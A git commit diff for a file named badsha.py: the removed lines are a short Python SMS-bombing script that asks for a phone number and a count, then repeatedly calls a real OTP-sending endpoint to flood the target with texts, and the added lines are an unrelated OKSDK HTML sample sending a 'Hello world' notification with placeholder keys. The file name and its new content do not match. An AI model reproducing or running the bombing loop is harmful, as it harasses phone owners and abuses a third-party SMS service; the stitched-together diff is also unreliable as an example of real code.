f978f4490ed5c6c277228e10fe0ada755b13e139
bdbadsha <116273703+bdbadsha@users.noreply.github.com>
2022-10-20 18:03:30 +0600

    Update badsha.py

--- badsha.py
+++ badsha.py
@@ -1,24 +1,111 @@
+<html>
 
-import requests ,os
+<head>
 
-os.system("clear")
+    <meta charset="UTF-8">
 
-badsha= """
+    <title>OKSDK - REST notifications.sendSimple (nosession)</title>
 
-________________$$$$$\n ______________$$____$$\n ______________$$____$$\n ______________$$____$$\n ______________$$____$$\n ______________$$____$$\n __________$$$$$$____$$$$$$\n ________$$____$$____$$____$$$$\n ________$$____$$____$$____$$__$$\n $$$$$$__$$____$$____$$____$$____$$\n $$____$$$$________________$$____$$\n $$______$$______________________$$\n __$$____$$______________________$$\n ___$$$__$$______________________$$\n ____$$__________________________$$\n _____$$$________________________$$\n ______$$______________________$$$\n _______$$$____________________$$\n ________$$____________________$$\n _________$$$________________$$$\n __________$$________________$$\n __________$$$$$$$$$$$$$$$$$$$$
+    <script type="text/javascript" src="../oksdk.js"></script>
 
-"""
+</head>
 
-print(badsha)
+<body>
 
-number=str(input(" Enter Ther number : "))
+<div id="content" style="display: none;">
 
-amount=int(input(" Enter SMS amount : "))
+    <p>
 
-api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
+        WARNING: This is just a sample (of REST method calling without active session using OKSDK).
 
-for i in range (amount):
+        In real game, storing application secret key inside your JS client app is prohibited due to
 
-  requests.get(api)
+        easy way to steal it and use for spamming purposes. Such methods should only be called from
 
-  print(str(i+1)+"SMS SEND ðŸ˜ˆ")
+        game server instead.
+
+        <br/>
+
+        <input type="button" onclick="sendSimple();" value="Send simple message"/><br/>
+
+        Posts a simple "hello world!" notification
+
+    </p>
+
+</div>
+
+<script type="text/javascript">
+
+    var currentUserUID = 0;
+
+    function sendSimple() {
+
+        OKSDK.REST.call("notifications.sendSimple",
+
+                {uid: currentUserUID, text: 'Hello world from oksdk.js!'},
+
+                function (status, data, error) {
+
+                    if (status == 'ok') {
+
+                        alert('SendSimple sent ok: ' + OKSDK.Util.toString(data));
+
+                    } else {
+
+                        alert('Error with send simple to user ' + currentUserUID + ': ' + OKSDK.Util.toString(error));
+
+                    }
+
+                },
+
+                {no_session: true, app_secret_key: '' /* <-- insert APP SECRET KEY here */}
+
+        );
+
+    }
+
+    document.addEventListener('DOMContentLoaded', function () {
+
+        var config = {
+
+            app_id: 0,      // <-- insert APP ID here
+
+            app_key: ''     // <-- insert APP PUBLIC KEY here
+
+        };
+
+        OKSDK.init(config, function () {
+
+            document.getElementById('content').style.display = '';
+
+            OKSDK.REST.call("users.getCurrentUser",
+
+                    {fields: "UID"},
+
+                    function (status, data, error) {
+
+                        if (status == 'ok') {
+
+                            currentUserUID = data.uid;
+
+                        } else {
+
+                            alert('Error with retrieving current user ' + OKSDK.Util.toString(error));
+
+                        }
+
+                    });
+
+        }, function (error) {
+
+            alert('OKSDK error' + OKSDK.Util.toString(error));
+
+        })
+
+    });
+
+</script>
+
+</body>
+
+</html>
